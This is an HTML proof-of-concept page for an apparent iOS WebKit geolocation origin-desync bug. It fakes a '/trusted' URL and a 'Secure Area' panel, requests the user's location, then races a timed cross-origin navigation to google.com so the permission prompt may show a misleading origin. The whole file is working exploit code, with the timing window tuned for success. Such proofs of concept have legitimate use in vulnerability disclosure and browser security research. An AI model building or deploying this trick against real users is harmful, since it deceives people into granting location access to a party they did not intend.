<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>iOS WebKit Geolocation Origin Desync PoC</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
}
#panel {
  display:none;
  max-width:480px;
  margin:70px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.25);
  text-align:center;
}
button {
  padding:12px 18px;
  font-size:15px;
  border:none;
  border-radius:10px;
  background:#007aff;
  color:#fff;
}
#log {
  margin-top:14px;
  font-size:13px;
  color:#333;
}
.small {
  font-size:12px;
  color:#666;
}
</style>
</head>

<body>

<div style="text-align:center;margin-top:40px">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h3>Secure Area</h3>
  <p class="small">Trusted path required</p>
  <div id="log">Status: idle</div>
</div>

<script>
const log = m =>
  document.getElementById('log').textContent = "Status: " + m;

let geoRequested = false;

/* 1️⃣ USER GESTURE */
document.getElementById('trigger').onclick = () => {
  /* Fake trusted URL */
  history.pushState({}, '', '/trusted');

  document.getElementById('panel').style.display = 'block';

  log("Requesting geolocation…");

  /* 2️⃣ GEOLOCATION REQUEST */
  navigator.geolocation.getCurrentPosition(
    () => log("Geolocation SUCCESS"),
    () => log("Geolocation DENIED")
  );

  geoRequested = true;
};

/* 3️⃣ NAVIGATION RACE — SAME PATTERN AS YOUR ORIGINAL PoC */
window.addEventListener('pageshow', () => {
  if (!geoRequested) return;

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        log("Navigating cross‑origin…");
        location.href = 'https://google.com:9090';
      }, 60); // 🔑 sweet spot (50–80ms)
    });
  });
});
</script>

</body>
</html>
